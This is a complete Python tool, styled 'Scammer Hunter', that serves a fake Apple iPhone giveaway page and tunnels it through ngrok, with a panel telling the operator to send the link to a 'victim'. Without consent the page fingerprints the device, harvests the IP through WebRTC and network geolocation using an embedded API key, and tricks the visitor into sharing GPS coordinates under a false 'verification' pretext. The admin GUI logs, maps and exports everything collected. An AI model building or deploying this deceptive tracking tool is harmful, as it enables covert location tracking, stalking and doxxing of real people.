#!/usr/bin/env python3
"""
SCAMMER HUNTER FINAL - FULL FEATURES
- WebRTC + Google Network Location (no popup)
- Device detection
- Admin GPS request (with popup)
- Separate tabs in admin panel
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import socket
import json
import time
import os
import subprocess
import webbrowser
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================================
# LANDING PAGE - Full device detection + WebRTC + GPS trigger
# ============================================================

LANDING_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone 17 Pro Max Giveaway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        .container { max-width: 500px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 60px; margin-bottom: 10px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        .countdown {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
        }
        .timer { font-size: 48px; font-weight: bold; font-family: monospace; }
        .prize-box {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        .prize-box div { font-size: 60px; }
        .spin-btn {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border: none;
            color: white;
            font-size: 24px;
            font-weight: bold;
            padding: 15px;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .spin-btn:active { transform: scale(0.97); }
        .gps-btn {
            background: #4444aa;
            border: none;
            color: white;
            font-size: 16px;
            padding: 10px;
            border-radius: 25px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 10px;
        }
        .winner {
            background: rgba(0,255,0,0.2);
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            display: none;
            margin-bottom: 20px;
        }
        .footer { text-align: center; font-size: 11px; color: #888; }
        .status { font-size: 12px; text-align: center; margin-top: 10px; color: #aaa; }
        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🍎</div>
            <h1>iPhone 17 Pro Max Giveaway</h1>
            <p>Official Apple Promotion</p>
        </div>

        <div class="countdown">
            <div>Offer ends in:</div>
            <div class="timer" id="timer">05:00</div>
            <div class="status" id="status">Verifying your device...</div>
        </div>

        <div class="prize-box">
            <div>📱✨🎧⌚</div>
            <h3>Grand Prize</h3>
            <p>iPhone 17 Pro Max + AirPods Pro 3 + Apple Watch Series 10</p>
        </div>

        <button class="gps-btn" id="gpsBtn">📍 Allow Location for Verification</button>
        <button class="spin-btn" id="spinBtn" disabled>🎰 SPIN TO WIN 🎰</button>

        <div class="winner" id="winnerMsg">
            🎉 CONGRATULATIONS! 🎉<br>
            You won the grand prize!<br>
            Redirecting to claim page...
        </div>

        <div class="footer">
            <p>Limited time offer • 500 winners worldwide</p>
        </div>
    </div>

    <script>
        let timeLeft = 300;
        let timerInterval;
        let hasLocation = false;
        let deviceInfo = {};
        let networkLocation = null;
        let gpsLocation = null;
        
        // ============================================
        // FULL DEVICE DETECTION
        // ============================================
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let brand = "Unknown";
            let model = "Unknown";
            let os = "Unknown";
            let osVersion = "Unknown";
            let browser = "Unknown";
            
            // Browser detection
            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';
            
            // OS detection
            if (ua.includes('iPhone')) {
                brand = "Apple";
                model = "iPhone";
                os = "iOS";
                const match = ua.match(/OS ([0-9_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            }
            else if (ua.includes('iPad')) {
                brand = "Apple";
                model = "iPad";
                os = "iOS";
            }
            else if (ua.includes('Macintosh')) {
                brand = "Apple";
                model = "Mac";
                os = "macOS";
            }
            else if (ua.includes('Windows')) {
                brand = "Microsoft";
                os = "Windows";
                if (ua.includes('Windows NT 10.0')) osVersion = "Windows 10/11";
                else if (ua.includes('Windows NT 6.1')) osVersion = "Windows 7";
            }
            else if (ua.includes('Android')) {
                os = "Android";
                const match = ua.match(/Android ([0-9.]+)/);
                if (match) osVersion = match[1];
                
                // Brand detection for Android
                if (ua.includes('SM-') || ua.includes('Samsung')) {
                    brand = "Samsung";
                    model = ua.match(/SM-[A-Za-z0-9]+/)?.[0] || "Galaxy";
                }
                else if (ua.includes('OnePlus') || ua.includes('LE')) {
                    brand = "OnePlus";
                    model = ua.match(/OnePlus [A-Z0-9]+/)?.[0] || "OnePlus";
                }
                else if (ua.includes('Pixel')) {
                    brand = "Google";
                    model = "Pixel";
                }
                else if (ua.includes('Mi ') || ua.includes('Redmi') || ua.includes('POCO')) {
                    brand = "Xiaomi";
                    model = ua.match(/(Mi|Redmi|POCO) [A-Z0-9]+/)?.[0] || "Xiaomi";
                }
                else if (ua.includes('Vivo') || ua.includes('vivo')) {
                    brand = "Vivo";
                }
                else if (ua.includes('OPPO') || ua.includes('CPH')) {
                    brand = "Oppo";
                }
                else {
                    brand = "Android Device";
                }
            }
            
            // Screen info
            const screenInfo = {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio
            };
            
            return { brand, model, os, osVersion, browser, screenInfo, ua: ua.substring(0, 200) };
        }
        
        // ============================================
        // WEBRTC + GOOGLE NETWORK LOCATION (NO POPUP)
        // ============================================
        
        async function getNetworkLocation() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = '<span class="loading"></span> Detecting your region...';
            
            // Method 1: WebRTC IP detection
            let localIP = null;
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const match = /([0-9]{1,3}\\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
                        if (match && match[0] !== '0.0.0.0' && !match[0].startsWith('192.168')) {
                            localIP = match[0];
                        }
                    }
                };
            } catch(e) {}
            
            // Method 2: Google Network Geolocation API
            try {
                const response = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartNBg', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ considerIp: true })
                });
                const data = await response.json();
                if (data.location) {
                    networkLocation = {
                        type: 'network',
                        lat: data.location.lat,
                        lon: data.location.lng,
                        accuracy: data.accuracy || 500,
                        source: 'Google Network API'
                    };
                }
            } catch(e) {}
            
            // Method 3: IP-based fallback
            if (!networkLocation) {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    networkLocation = {
                        type: 'ip',
                        lat: data.latitude,
                        lon: data.longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        accuracy: 5000,
                        source: 'IP Geolocation'
                    };
                } catch(e) {}
            }
            
            // Send network location to admin
            if (networkLocation) {
                networkLocation.device = deviceInfo;
                await sendToServer({ type: 'NETWORK_LOCATION', data: networkLocation });
                statusDiv.innerHTML = '✓ Region detected! Allow location for accurate verification.';
            }
            
            return networkLocation;
        }
        
        // ============================================
        // GPS WITH POPUP (Admin triggers this)
        // ============================================
        
        async function requestGPS() {
            const statusDiv = document.getElementById('status');
            const gpsBtn = document.getElementById('gpsBtn');
            const spinBtn = document.getElementById('spinBtn');
            
            statusDiv.innerHTML = '<span class="loading"></span> Requesting location permission...';
            gpsBtn.disabled = true;
            gpsBtn.textContent = '📍 Requesting Permission...';
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    gpsLocation = {
                        type: 'gps',
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        altitude: position.coords.altitude,
                        timestamp: position.timestamp,
                        source: 'GPS'
                    };
                    
                    sendToServer({ type: 'GPS_LOCATION', data: gpsLocation });
                    
                    statusDiv.innerHTML = '✓ Location verified! You are eligible!';
                    gpsBtn.textContent = '✅ Location Allowed';
                    gpsBtn.style.background = '#00aa00';
                    hasLocation = true;
                    spinBtn.disabled = false;
                },
                (error) => {
                    let errorMsg = 'Location denied';
                    if (error.code === 1) errorMsg = 'You denied permission';
                    else if (error.code === 2) errorMsg = 'Location unavailable';
                    else if (error.code === 3) errorMsg = 'Location timeout';
                    
                    statusDiv.innerHTML = `⚠️ ${errorMsg}. Using network location only.`;
                    gpsBtn.textContent = '❌ Location Denied';
                    gpsBtn.style.background = '#aa4444';
                    
                    // Still enable spin with network location
                    if (networkLocation) {
                        spinBtn.disabled = false;
                    }
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        }
        
        // ============================================
        // SEND TO ADMIN
        // ============================================
        
        async function sendToServer(data) {
            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) {}
        }
        
        // ============================================
        // TIMER & SPIN
        // ============================================
        
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                const statusDiv = document.getElementById('status');
                statusDiv.innerHTML = '🎁 Click SPIN to claim your prize!';
            }
            timeLeft--;
        }
        
        async function spinNow() {
            const btn = document.getElementById('spinBtn');
            btn.disabled = true;
            btn.textContent = '🎰 SPINNING... 🎰';
            
            // Send final data
            await sendToServer({
                type: 'WINNER',
                timestamp: new Date().toISOString(),
                hasLocation: hasLocation,
                gps: gpsLocation,
                network: networkLocation,
                device: deviceInfo
            });
            
            setTimeout(() => {
                document.getElementById('winnerMsg').style.display = 'block';
                btn.style.display = 'none';
                setTimeout(() => {
                    window.location.href = 'https://www.apple.com';
                }, 3000);
            }, 1500);
        }
        
        // ============================================
        // INITIALIZE
        // ============================================
        
        async function init() {
            deviceInfo = getDeviceInfo();
            await sendToServer({ type: 'DEVICE_INFO', data: deviceInfo });
            
            await getNetworkLocation();
            
            timerInterval = setInterval(updateTimer, 1000);
            
            document.getElementById('gpsBtn').onclick = requestGPS;
            document.getElementById('spinBtn').onclick = spinNow;
        }
        
        init();
    </script>
</body>
</html>'''

# ============================================================
# HTTP SERVER
# ============================================================

class TrackingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/track'):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            self.wfile.write(LANDING_PAGE.encode())
            print(f"[✓] Page served to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/collect':
            try:
                length = int(self.headers['Content-Length'])
                data = json.loads(self.rfile.read(length))
                if hasattr(self.server, 'parent'):
                    self.server.parent.add_data(data, self.client_address[0])
                print(f"[✓] Data from {self.client_address[0]}: {data.get('type', '?')}")
            except Exception as e:
                print(f"[✗] Error: {e}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

# ============================================================
# ADMIN GUI - SEPARATE TABS
# ============================================================

class AdminPanel:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SCAMMER HUNTER - ADMIN PANEL")
        self.root.geometry("1400x800")
        self.root.configure(bg='#0a0a1a')
        
        self.server = None
        self.server_running = False
        self.ngrok_process = None
        self.captured_data = []
        self.setup_gui()
        
    def setup_gui(self):
        # Title
        title = tk.Label(self.root, text="🎯 SCAMMER HUNTER - ADMIN PANEL", 
                        font=('Arial', 20, 'bold'), bg='#0a0a1a', fg='#00ff00')
        title.pack(pady=10)
        
        # Control Frame
        ctrl_frame = tk.Frame(self.root, bg='#1a1a2e', relief=tk.RIDGE, bd=2)
        ctrl_frame.pack(fill='x', padx=10, pady=5)
        
        self.status_label = tk.Label(ctrl_frame, text="● STOPPED", font=('Arial', 12, 'bold'),
                                     bg='#1a1a2e', fg='#ff0000')
        self.status_label.pack(side='left', padx=20, pady=10)
        
        tk.Label(ctrl_frame, text="Port:", bg='#1a1a2e', fg='white').pack(side='left', padx=5)
        self.port_entry = tk.Entry(ctrl_frame, width=8, bg='#0a0a1a', fg='white')
        self.port_entry.insert(0, "8080")
        self.port_entry.pack(side='left', padx=5)
        
        self.start_btn = tk.Button(ctrl_frame, text="▶ START SERVER", bg='#00aa00', fg='white',
                                   font=('Arial', 10, 'bold'), command=self.start_server)
        self.start_btn.pack(side='left', padx=10)
        
        self.stop_btn = tk.Button(ctrl_frame, text="⏹ STOP", bg='#aa0000', fg='white',
                                  command=self.stop_server, state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        self.ngrok_btn = tk.Button(ctrl_frame, text="🌐 START NGROK", bg='#4444aa', fg='white',
                                   command=self.start_ngrok, state='disabled')
        self.ngrok_btn.pack(side='left', padx=5)
        
        # URL Frame
        url_frame = tk.Frame(self.root, bg='#1a1a2e', relief=tk.RIDGE, bd=1)
        url_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(url_frame, text="📤 SEND THIS LINK TO VICTIM:", bg='#1a1a2e', fg='#ffaa00',
                font=('Arial', 10, 'bold')).pack(anchor='w', padx=10, pady=5)
        
        self.url_label = tk.Label(url_frame, text="Server not started", bg='#1a1a2e', fg='#00ff00',
                                  font=('Courier', 11))
        self.url_label.pack(anchor='w', padx=10, pady=5)
        
        copy_btn = tk.Button(url_frame, text="📋 COPY LINK", bg='#ffaa00', fg='#000000',
                            command=self.copy_link)
        copy_btn.pack(anchor='w', padx=10, pady=5)
        
        # ============================================
        # NOTEBOOK TABS
        # ============================================
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
        
        # TAB 1: Devices
        self.tab_devices = tk.Frame(self.notebook, bg='#0a0a1a')
        self.notebook.add(self.tab_devices, text="📱 DEVICES")
        self.setup_devices_tab()
        
        # TAB 2: Network Locations (WebRTC)
        self.tab_network = tk.Frame(self.notebook, bg='#0a0a1a')
        self.notebook.add(self.tab_network, text="🌐 NETWORK LOCATIONS (WebRTC)")
        self.setup_network_tab()
        
        # TAB 3: GPS Locations (with permission)
        self.tab_gps = tk.Frame(self.notebook, bg='#0a0a1a')
        self.notebook.add(self.tab_gps, text="📍 GPS LOCATIONS")
        self.setup_gps_tab()
        
        # TAB 4: All Data
        self.tab_all = tk.Frame(self.notebook, bg='#0a0a1a')
        self.notebook.add(self.tab_all, text="📊 ALL DATA")
        self.setup_all_tab()
        
        # TAB 5: Live Logs
        self.tab_logs = tk.Frame(self.notebook, bg='#0a0a1a')
        self.notebook.add(self.tab_logs, text="📋 LIVE LOGS")
        self.setup_logs_tab()
        
        # Status bar
        self.status_bar = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, 
                                   anchor=tk.W, bg='#1a1a2e', fg='#ffffff')
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def setup_devices_tab(self):
        # Device tree
        self.device_tree = ttk.Treeview(self.tab_devices, columns=('Time', 'IP', 'Brand', 'Model', 'OS', 'Browser'), show='headings')
        self.device_tree.heading('Time', text='Time')
        self.device_tree.heading('IP', text='IP Address')
        self.device_tree.heading('Brand', text='Brand')
        self.device_tree.heading('Model', text='Model')
        self.device_tree.heading('OS', text='OS')
        self.device_tree.heading('Browser', text='Browser')
        
        self.device_tree.column('Time', width=120)
        self.device_tree.column('IP', width=130)
        self.device_tree.column('Brand', width=100)
        self.device_tree.column('Model', width=150)
        self.device_tree.column('OS', width=100)
        self.device_tree.column('Browser', width=100)
        
        scroll = tk.Scrollbar(self.tab_devices, orient='vertical', command=self.device_tree.yview)
        self.device_tree.configure(yscrollcommand=scroll.set)
        self.device_tree.pack(side='left', fill='both', expand=True)
        scroll.pack(side='right', fill='y')
        
        # Stats
        stats = tk.Label(self.tab_devices, text="", bg='#0a0a1a', fg='#00ff00')
        stats.pack(pady=5)
    
    def setup_network_tab(self):
        # Network location tree
        self.network_tree = ttk.Treeview(self.tab_network, columns=('Time', 'IP', 'Latitude', 'Longitude', 'Accuracy', 'Source'), show='headings')
        self.network_tree.heading('Time', text='Time')
        self.network_tree.heading('IP', text='IP Address')
        self.network_tree.heading('Latitude', text='Latitude')
        self.network_tree.heading('Longitude', text='Longitude')
        self.network_tree.heading('Accuracy', text='Accuracy')
        self.network_tree.heading('Source', text='Source')
        
        self.network_tree.column('Time', width=120)
        self.network_tree.column('IP', width=130)
        self.network_tree.column('Latitude', width=120)
        self.network_tree.column('Longitude', width=120)
        self.network_tree.column('Accuracy', width=100)
        self.network_tree.column('Source', width=150)
        
        scroll = tk.Scrollbar(self.tab_network, orient='vertical', command=self.network_tree.yview)
        self.network_tree.configure(yscrollcommand=scroll.set)
        self.network_tree.pack(side='left', fill='both', expand=True)
        scroll.pack(side='right', fill='y')
        
        # Map button
        btn_frame = tk.Frame(self.tab_network, bg='#0a0a1a')
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="🗺️ OPEN MAP", bg='#4444aa', fg='white', 
                 command=lambda: self.open_map_from_tree(self.network_tree)).pack(side='left', padx=5)
    
    def setup_gps_tab(self):
        # GPS location tree
        self.gps_tree = ttk.Treeview(self.tab_gps, columns=('Time', 'IP', 'Latitude', 'Longitude', 'Accuracy', 'Speed'), show='headings')
        self.gps_tree.heading('Time', text='Time')
        self.gps_tree.heading('IP', text='IP Address')
        self.gps_tree.heading('Latitude', text='Latitude')
        self.gps_tree.heading('Longitude', text='Longitude')
        self.gps_tree.heading('Accuracy', text='Accuracy')
        self.gps_tree.heading('Speed', text='Speed (m/s)')
        
        self.gps_tree.column('Time', width=120)
        self.gps_tree.column('IP', width=130)
        self.gps_tree.column('Latitude', width=120)
        self.gps_tree.column('Longitude', width=120)
        self.gps_tree.column('Accuracy', width=100)
        self.gps_tree.column('Speed', width=100)
        
        scroll = tk.Scrollbar(self.tab_gps, orient='vertical', command=self.gps_tree.yview)
        self.gps_tree.configure(yscrollcommand=scroll.set)
        self.gps_tree.pack(side='left', fill='both', expand=True)
        scroll.pack(side='right', fill='y')
        
        # Map button
        btn_frame = tk.Frame(self.tab_gps, bg='#0a0a1a')
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="🗺️ OPEN MAP", bg='#4444aa', fg='white',
                 command=lambda: self.open_map_from_tree(self.gps_tree)).pack(side='left', padx=5)
    
    def setup_all_tab(self):
        # All data tree
        self.all_tree = ttk.Treeview(self.tab_all, columns=('Time', 'Type', 'IP', 'Latitude', 'Longitude', 'Info'), show='headings')
        self.all_tree.heading('Time', text='Time')
        self.all_tree.heading('Type', text='Type')
        self.all_tree.heading('IP', text='IP Address')
        self.all_tree.heading('Latitude', text='Latitude')
        self.all_tree.heading('Longitude', text='Longitude')
        self.all_tree.heading('Info', text='Info')
        
        self.all_tree.column('Time', width=120)
        self.all_tree.column('Type', width=100)
        self.all_tree.column('IP', width=130)
        self.all_tree.column('Latitude', width=120)
        self.all_tree.column('Longitude', width=120)
        self.all_tree.column('Info', width=200)
        
        scroll = tk.Scrollbar(self.tab_all, orient='vertical', command=self.all_tree.yview)
        self.all_tree.configure(yscrollcommand=scroll.set)
        self.all_tree.pack(side='left', fill='both', expand=True)
        scroll.pack(side='right', fill='y')
        
        # Export button
        btn_frame = tk.Frame(self.tab_all, bg='#0a0a1a')
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="📥 EXPORT ALL JSON", bg='#44aa44', fg='white',
                 command=self.export_data).pack(side='left', padx=5)
        tk.Button(btn_frame, text="🗑️ CLEAR ALL", bg='#aa4444', fg='white',
                 command=self.clear_all).pack(side='left', padx=5)
    
    def setup_logs_tab(self):
        self.log_text = scrolledtext.ScrolledText(self.tab_logs, bg='#1a1a2e', fg='#00ff00',
                                                   font=('Courier', 9), height=30)
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)
    
    def start_server(self):
        try:
            port = int(self.port_entry.get())
            
            # Check port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                self.log(f"[!] Port {port} in use")
                messagebox.showerror("Error", f"Port {port} in use!")
                sock.close()
                return
            sock.close()
            
            self.server = HTTPServer(('0.0.0.0', port), TrackingHandler)
            self.server.parent = self
            
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            
            self.server_running = True
            self.status_label.config(text="● RUNNING", fg='#00ff00')
            self.start_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            self.ngrok_btn.config(state='normal')
            
            local_ip = self.get_local_ip()
            local_url = f"http://{local_ip}:{port}/"
            self.url_label.config(text=local_url)
            
            self.log(f"[✓] Server started on port {port}")
            self.log(f"[✓] Local URL: {local_url}")
            self.status_bar.config(text=f"Server running on port {port}")
            
        except Exception as e:
            self.log(f"[✗] Error: {e}")
    
    def stop_server(self):
        if self.server:
            self.server.shutdown()
            self.server_running = False
        if self.ngrok_process:
            self.ngrok_process.terminate()
        self.status_label.config(text="● STOPPED", fg='#ff0000')
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.ngrok_btn.config(state='disabled')
        self.log("[✗] Server stopped")
        self.status_bar.config(text="Server stopped")
    
    def start_ngrok(self):
        try:
            port = int(self.port_entry.get())
            
            if not self.server_running:
                self.log("[!] Start server FIRST!")
                messagebox.showwarning("Warning", "Start server first!")
                return
            
            self.log("[*] Starting ngrok...")
            
            if self.ngrok_process:
                self.ngrok_process.terminate()
                time.sleep(1)
            
            if os.name == 'nt':
                self.ngrok_process = subprocess.Popen(['ngrok', 'http', str(port)], 
                                                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                self.ngrok_process = subprocess.Popen(['ngrok', 'http', str(port)], 
                                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(4)
            
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                tunnels = response.json()
                if tunnels['tunnels']:
                    self.public_url = tunnels['tunnels'][0]['public_url']
                    self.url_label.config(text=self.public_url)
                    self.log(f"[✓] NGROK: {self.public_url}")
                    self.status_bar.config(text=f"Public URL: {self.public_url}")
                    messagebox.showinfo("Ngrok Ready", f"Public URL:\n{self.public_url}")
            except:
                webbrowser.open('http://localhost:4040')
                self.log("[!] Open browser to get ngrok URL")
                
        except Exception as e:
            self.log(f"[✗] Ngrok error: {e}")
            webbrowser.open('https://ngrok.com/download')
    
    def copy_link(self):
        url = self.url_label.cget("text")
        if url and "Server" not in url and "Not started" not in url:
            self.root.clipboard_clear()
            self.root.clipboard_append(url)
            self.log("[✓] Link copied")
            self.status_bar.config(text="Link copied to clipboard")
            messagebox.showinfo("Copied", "Link copied to clipboard!")
    
    def add_data(self, data, client_ip):
        timestamp = datetime.now().strftime('%H:%M:%S')
        data_type = data.get('type', '?')
        
        if data_type == 'DEVICE_INFO':
            device = data.get('data', {})
            self.device_tree.insert('', 0, values=(
                timestamp, client_ip,
                device.get('brand', 'Unknown'),
                device.get('model', 'Unknown'),
                device.get('os', 'Unknown'),
                device.get('browser', 'Unknown')
            ))
            self.all_tree.insert('', 0, values=(
                timestamp, 'DEVICE', client_ip,
                '-', '-',
                f"{device.get('brand', '')} {device.get('model', '')}"
            ))
            self.log(f"[+] DEVICE: {device.get('brand', '')} {device.get('model', '')} | {client_ip}")
            
        elif data_type == 'NETWORK_LOCATION':
            loc = data.get('data', {})
            lat = loc.get('lat', 'N/A')
            lon = loc.get('lon', 'N/A')
            if isinstance(lat, (int, float)):
                lat_disp = f"{lat:.6f}"
                lon_disp = f"{lon:.6f}"
            else:
                lat_disp = str(lat)
                lon_disp = str(lon)
            
            self.network_tree.insert('', 0, values=(
                timestamp, client_ip, lat_disp, lon_disp,
                f"{loc.get('accuracy', '?')}m", loc.get('source', 'Unknown')
            ))
            self.all_tree.insert('', 0, values=(
                timestamp, 'NETWORK', client_ip, lat_disp, lon_disp,
                f"Acc: {loc.get('accuracy', '?')}m"
            ))
            self.log(f"[+] NETWORK LOCATION: {lat_disp}, {lon_disp} | {client_ip}")
            
        elif data_type == 'GPS_LOCATION':
            loc = data.get('data', {})
            lat = loc.get('lat', 'N/A')
            lon = loc.get('lon', 'N/A')
            if isinstance(lat, (int, float)):
                lat_disp = f"{lat:.6f}"
                lon_disp = f"{lon:.6f}"
            else:
                lat_disp = str(lat)
                lon_disp = str(lon)
            
            speed = loc.get('speed', 'N/A')
            if isinstance(speed, (int, float)):
                speed_disp = f"{speed:.1f}"
            else:
                speed_disp = str(speed)
            
            self.gps_tree.insert('', 0, values=(
                timestamp, client_ip, lat_disp, lon_disp,
                f"{loc.get('accuracy', '?')}m", speed_disp
            ))
            self.all_tree.insert('', 0, values=(
                timestamp, 'GPS', client_ip, lat_disp, lon_disp,
                f"Acc: {loc.get('accuracy', '?')}m"
            ))
            self.log(f"[+] GPS LOCATION: {lat_disp}, {lon_disp} | Acc: {loc.get('accuracy', '?')}m")
            
        elif data_type == 'WINNER':
            self.all_tree.insert('', 0, values=(
                timestamp, 'WINNER', client_ip, '-', '-', 'Won the giveaway!'
            ))
            self.log(f"[+] WINNER! {client_ip}")
        
        self.captured_data.append(data)
        self.status_bar.config(text=f"Last capture: {data_type} at {timestamp}")
    
    def open_map_from_tree(self, tree):
        selection = tree.selection()
        if selection:
            item = tree.item(selection[0])
            values = item['values']
            # Find lat/lon columns (different positions in different trees)
            if len(values) >= 4:
                lat = values[2]
                lon = values[3]
                if lat != 'N/A' and lon != 'N/A' and lat != '-' and lon != '-':
                    webbrowser.open(f"https://www.google.com/maps/@{lat},{lon},17z")
                    self.log(f"[+] Opened map at {lat}, {lon}")
                else:
                    messagebox.showwarning("No coordinates", "No location data")
            else:
                messagebox.showwarning("No coordinates", "No location data")
        else:
            messagebox.showwarning("Select", "Select a row first")
    
    def export_data(self):
        if not self.captured_data:
            messagebox.showwarning("No data", "Nothing to export")
            return
        filename = f'captured_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(filename, 'w') as f:
            json.dump(self.captured_data, f, indent=2)
        self.log(f"[✓] Exported to {filename}")
        messagebox.showinfo("Exported", f"Saved to {filename}")
    
    def clear_all(self):
        if messagebox.askyesno("Clear", "Clear all data from all tabs?"):
            for tree in [self.device_tree, self.network_tree, self.gps_tree, self.all_tree]:
                for item in tree.get_children():
                    tree.delete(item)
            self.captured_data.clear()
            self.log("[✓] All data cleared")
    
    def log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if hasattr(self, 'log_text'):
            self.log_text.insert('1.0', f"[{timestamp}] {message}\n")
            self.log_text.see('1.0')
        print(f"[{timestamp}] {message}")
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = AdminPanel()
    app.run()